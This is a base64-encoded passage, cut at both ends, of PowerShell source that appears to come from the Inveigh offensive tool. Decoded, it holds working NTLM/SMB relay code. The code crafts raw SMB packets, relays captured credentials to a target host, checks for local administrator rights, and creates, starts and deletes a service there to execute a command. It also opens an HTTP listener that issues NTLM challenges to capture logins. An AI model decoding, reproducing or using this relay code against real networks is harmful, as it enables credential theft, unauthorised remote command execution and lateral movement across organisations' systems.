AgICAgJFNNQl9yZWxheV9jb21tYW5kX2xlbmd0aF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY29tbWFuZF9sZW5ndGhfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jb21tYW5kX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRTTUJfbXVsdGlwbGV4X2lkID0gMHgwOQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIDcKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgOAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kID0gMHgwMCwweDAwLDB4MDAsMHg3MywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmYsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwNSwweDI4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDA4ICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGEsMHgwMCwweDBlLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4ZmYsMHhmZiwweGZmLDB4MDgsMHgwMCwweDM0LDB4MDAsMHgwMCwweDAwLDB4MzQsMHgwMCwweDNmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MzQsMHgwMCwweDA1LDB4MDAsMHgwMCwweDAzLDB4MTAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDM0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxYywweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDEzLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jb250ZXh0X2hhbmRsZXIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAxMAogICAgICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3NlbmQgPSAweDAwLDB4MDAsMHgwMCwweDZiLDB4ZmYsMHg1MywweDRkLDB4NDIsMHgyZiwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTgsMHgwNSwweDI4LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl91c2VyX0lEICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBiLDB4MDAsMHgwZSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDBiLDB4MDEsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwOCwweDAwLDB4MmMsMHgwMCwweDAwLDB4MDAsMHgyYywweDAwLDB4M2YsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MmMsMHgwMCwweDA1LDB4MDAsMHgwMCwweDAzLDB4MTAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgyYywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MTQsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jb250ZXh0X2hhbmRsZXIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAxMQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9SZWFkQW5kUmVxdWVzdAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5Xcml0ZSgkU01CX3JlbGF5X2V4ZWN1dGVfc2VuZCwwLCRTTUJfcmVsYXlfZXhlY3V0ZV9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3RpbWVvdXQgPSBOZXctVGltZXNwYW4gLVNlY29uZHMgJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2hpbGUoISRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9leGVjdXRlX3N0b3B3YXRjaC5FbGFwc2VkIC1nZSAkU01CX3JlbGF5X2V4ZWN1dGVfdGltZW91dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBkaWRuJ3QgcmVzcG9uZCB3aXRoaW4gJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQgc2Vjb25kcyIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBicmVhayBTTUJfcmVsYXlfZXhlY3V0ZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAoJGsgLWVxIDUpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLDAsJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzLkxlbmd0aCkKICAgICAgICAgICAgICAgICRTTUJfY29udGV4dF9oYW5kbGVyID0gJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzg4Li4xMDddCgogICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbMTA4Li4xMTFdKSAtZXEgJzAwLTAwLTAwLTAwJyAtYW5kIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jb250ZXh0X2hhbmRsZXIpIC1uZSAnMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9leGVjdXRlX2J5dGVzWzEwOC4uMTExXSkgLWVxICcwNS0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGlzIG5vdCBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJSZWxheV9mYWlsZWRfbGlzdC5BZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgoJGsgLWVxIDcpIC1vciAoJGsgLWVxIDkpIC1vciAoJGsgLWVxIDExKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX3N0cmVhbS5SZWFkKCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcywwLCRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlcy5MZW5ndGgpCgogICAgICAgICAgICAgICAgc3dpdGNoKCRrKQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICA3CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NvbnRleHRfaGFuZGxlciA9ICRTTUJfcmVsYXlfZXhlY3V0ZV9ieXRlc1s5Mi4uMTExXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3JfbWVzc2FnZSA9ICJTZXJ2aWNlIGNyZWF0aW9uIGZhdWx0IGNvbnRleHQgbWlzbWF0Y2giCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAxMQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX2Vycm9yX21lc3NhZ2UgPSAiU2VydmljZSBzdGFydCBmYXVsdCBjb250ZXh0IG1pc21hdGNoIgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgMTMKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlID0gIlNlcnZpY2UgZGVsZXRpb24gZmF1bHQgY29udGV4dCBtaXNtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY29udGV4dF9oYW5kbGVyWzAuLjNdKSAtbmUgJzAwLTAwLTAwLTAwJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXNbODguLjkxXSkgLWVxICcxYS0wMC0wMC0xYycpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRTTUJfcmVsYXlfZXhlY3V0ZV9lcnJvcl9tZXNzYWdlIHNlcnZpY2Ugb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkU01CX3JlbGF5X2V4ZWN1dGVfZXJyb3Igb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZmFpbGVkID0gJHRydWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfZXhlY3V0ZV9zdHJlYW0uUmVhZCgkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMsMCwkU01CX3JlbGF5X2V4ZWN1dGVfYnl0ZXMuTGVuZ3RoKSAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoISRTTUJfcmVsYXlfZmFpbGVkIC1hbmQgJGsgLWVxIDcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigoISRTTUJfcmVsYXlfZmFpbGVkKSAtYW5kICgkayAtZXEgOSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgY29tbWFuZCBsaWtlbHkgZXhlY3V0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBjb21tYW5kIGxpa2VseSBleGVjdXRlZCBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJFNNQlJlbGF5QXV0b0Rpc2FibGUgLWVxICdZJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXkgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIHJlbGF5IGF1dG8gZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3MiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBhdXRvIGRpc2FibGVkIGR1ZSB0byBzdWNjZXNzIildKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYoISRTTUJfcmVsYXlfZmFpbGVkIC1hbmQgJGsgLWVxIDExKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGRlbGV0ZWQgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBkZWxldGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAKICAgICAgICAgICAgJFNNQl9yZWxheV9leGVjdXRlX1JlYWRBbmRSZXF1ZXN0ID0gMHgwMCwweDAwLDB4MDAsMHgzNywweGZmLDB4NTMsMHg0ZCwweDQyLDB4MmUsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxOCwweDA1LDB4MjgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwOCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX211bHRpcGxleF9JRCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwYSwweGZmLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NTgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDIsMHg1OCwweDAyLDB4ZmYsMHhmZiwweGZmLDB4ZmYsMHgwMCwweDAwLDB4MDAsMHgwMAogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQl9yZWxheV9mYWlsZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgZmFpbGVkIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgZmFpbGVkIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgIEJSRUFLIFNNQl9yZWxheV9leGVjdXRlX2xvb3AKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGsrKwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgfQoKfQoKIyBIVFRQL0hUVFBTIFNlcnZlciBTY3JpcHRCbG9jayAtIEhUVFAvSFRUUFMgbGlzdGVuZXIKJEhUVFBfc2NyaXB0YmxvY2sgPSAKeyAKICAgIHBhcmFtICgkU01CUmVsYXlUYXJnZXQsJFNNQlJlbGF5Q29tbWFuZCwkU01CUmVsYXlVc2VybmFtZXMsJFNNQlJlbGF5QXV0b0Rpc2FibGUsJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQsJFdQQURBdXRoKQoKICAgIGZ1bmN0aW9uIE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgIHsKCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUKICAgICAgICAkSFRUUF90aW1lc3RhbXAgPSAkSFRUUF90aW1lc3RhbXAuVG9GaWxlVGltZSgpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3RpbWVzdGFtcCkpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gJEhUVFBfdGltZXN0YW1wLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KCiAgICAgICAgaWYoJEludmVpZ2guY2hhbGxlbmdlKQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEludmVpZ2guY2hhbGxlbmdlCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRJbnZlaWdoLmNoYWxsZW5nZS5JbnNlcnQoMiwnLScpLkluc2VydCg1LCctJykuSW5zZXJ0KDgsJy0nKS5JbnNlcnQoMTEsJy0nKS5JbnNlcnQoMTQsJy0nKS5JbnNlcnQoMTcsJy0nKS5JbnNlcnQoMjAsJy0nKQogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSBbU3RyaW5nXSgxLi44IHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZSA9ICRIVFRQX2NoYWxsZW5nZV9ieXRlcyAtcmVwbGFjZSAnICcsJycKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzLlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICB9CgogICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLkFkZCgkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnLCcgKyAkSFRUUF9jaGFsbGVuZ2UpICA+ICRudWxsCgogICAgICAgICRIVFRQX05UTE1fYnl0ZXMgPSAweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMCwweDA2LDB4MDAsMHgwNiwweDAwLDB4MzgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDUsMHg4MiwweDg5LDB4YTIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg4MiwweDAwLDB4ODIsMHgwMCwweDNlLDB4MDAsMHgwMCwweDAwLDB4MDYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYsMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDAsMHgwMiwweDAwLDB4MDYsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDAsMHgwMSwweDAwLDB4MTAsMHgwMCwweDQ4LDB4MDAsMHg0ZiwweDAwLDB4NTMsMHgwMCwweDU0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NGUsMHgwMCwweDQxLDB4MDAsMHg0ZCwweDAwLDB4NDUsMHgwMCwweDA0LDB4MDAsMHgxMiwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsC